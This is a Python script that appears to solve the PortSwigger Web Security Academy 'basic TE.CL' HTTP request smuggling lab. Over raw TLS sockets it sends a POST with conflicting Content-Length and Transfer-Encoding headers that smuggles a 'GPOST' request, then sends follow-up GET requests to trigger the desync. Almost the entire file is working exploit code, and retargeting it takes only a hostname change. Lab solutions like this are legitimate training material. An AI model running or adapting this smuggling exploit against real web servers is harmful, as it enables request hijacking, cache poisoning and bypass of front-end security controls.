import socket
import ssl
import sys


hostname = 'acf01ffe1f549d7f807135c600250036.web-security-academy.net'
context = ssl.create_default_context()

def sendReq(req):
	print('[*] Request')
	req = req.replace('\x0a','\x0d\x0a')
	print(req)
	#print(req.encode('hex'))
	print('=====')
	s = socket.create_connection((hostname,443))
	ssock  = context.wrap_socket(s,server_hostname=hostname)
	a = ssock.send(req.encode('utf-8'))
	print((a))
	print()
	print()
	d = ssock.recv(4096)
	print(str(d).split('\r\n')[0])
	s.close()
	
	return len(d)




originalReq = '''GET / HTTP/1.1
Host: acf01ffe1f549d7f807135c600250036.web-security-academy.net
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
Accept-Encoding: deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

'''

payload = '''GPOST / HTTP/1.1
Host:acf01ffe1f549d7f807135c600250036.web-security-academy.net
'''

tpayload = payload.split('\n')
linecount = 0 

for i in range(0,len(tpayload)):
	if tpayload[i]!='':
		linecount += 1

body = '''
%s
%s
0

'''%(hex(len(payload)+linecount)[2:],payload)





tecl = '''POST / HTTP/1.1
Host:%s
Content-Length:%d
Transfer-Encoding:chunked
Accept-Encoding: deflate
'''%(hostname,len(hex(len(payload)+2)[2:]))

tecl = tecl+body
sendReq(tecl)
for i in range(0,2):
	sendReq(originalReq)
